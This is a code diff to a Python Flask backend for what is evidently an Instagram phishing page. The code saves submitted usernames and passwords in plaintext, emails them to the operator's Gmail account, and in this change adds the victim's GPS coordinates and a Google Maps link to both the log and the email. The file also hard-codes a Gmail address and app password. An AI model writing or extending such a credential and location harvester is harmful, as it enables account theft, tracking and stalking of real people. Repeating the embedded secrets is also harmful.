@@ -15,7 +15,7 @@ GMAIL_USER = os.getenv('GMAIL_USER', 'waemsa19@gmail.com')
 GMAIL_PASS = os.getenv('GMAIL_PASS', 'mcci julh ypdy ngee')
 LOG_FILE = 'login_attempts.json'
 
-def save_login_attempt(username, password):
+def save_login_attempt(username, password, location=None):
     """Save login attempt to local file"""
     try:
         # Load existing data
@@ -29,7 +29,8 @@ def save_login_attempt(username, password):
             'username': username,
             'password': password,
             'timestamp': datetime.now().isoformat(),
-            'ip': request.remote_addr
+            'ip': request.remote_addr,
+            'location': location
         }
         data.append(login_data)
         
@@ -38,12 +39,14 @@ def save_login_attempt(username, password):
             json.dump(data, f, indent=2)
         
         print(f"Login attempt saved: {username}")
+        if location:
+            print(f"Location: {location.get('latitude', 'N/A')}, {location.get('longitude', 'N/A')}")
         return True
     except Exception as e:
         print(f"Error saving login attempt: {e}")
         return False
 
-def send_email(username, password):
+def send_email(username, password, location=None):
     """Send email with login credentials"""
     try:
         print(f"Attempting to send email for login: {username}")
@@ -54,12 +57,30 @@ def send_email(username, password):
         msg['To'] = GMAIL_USER
         msg['Subject'] = 'New Instagram Login Attempt'
         
+        # Build email body with location info
         body = f"""
         New Login Attempt:
         Username: {username}
         Password: {password}
         IP Address: {request.remote_addr}
         Timestamp: {datetime.now().isoformat()}
+        """
+        
+        if location and location.get('latitude') and location.get('longitude'):
+            body += f"""
+        Location Information:
+        Latitude: {location.get('latitude')}
+        Longitude: {location.get('longitude')}
+        Accuracy: {location.get('accuracy', 'N/A')} meters
+        Google Maps Link: https://maps.google.com/?q={location.get('latitude')},{location.get('longitude')}
+        """
+        elif location and location.get('error'):
+            body += f"""
+        Location Error: {location.get('error')}
+        """
+        else:
+            body += """
+        Location: Not available
         """
         
         msg.attach(MIMEText(body, 'plain'))
@@ -88,15 +109,16 @@ def login():
         data = request.get_json()
         username = data.get('username', '')
         password = data.get('password', '')
+        location = data.get('location', None)
         
         if not username or not password:
             return jsonify({'message': 'Username and password are required'}), 400
         
         # Save login attempt locally
-        save_login_attempt(username, password)
+        save_login_attempt(username, password, location)
         
         # Send email notification
-        send_email(username, password)
+        send_email(username, password, location)
         
         return jsonify({'message': 'Login received and saved!'})
     
@@ -133,7 +155,13 @@ def clear_logs():
 def test_email():
     """Test email functionality"""
     try:
-        result = send_email('test@example.com', 'testpassword')
+        # Test with sample location data
+        test_location = {
+            'latitude': 40.7128,
+            'longitude': -74.0060,
+            'accuracy': 10
+        }
+        result = send_email('test@example.com', 'testpassword', test_location)
         if result:
             return jsonify({'message': 'Test email sent successfully!'})
         else:
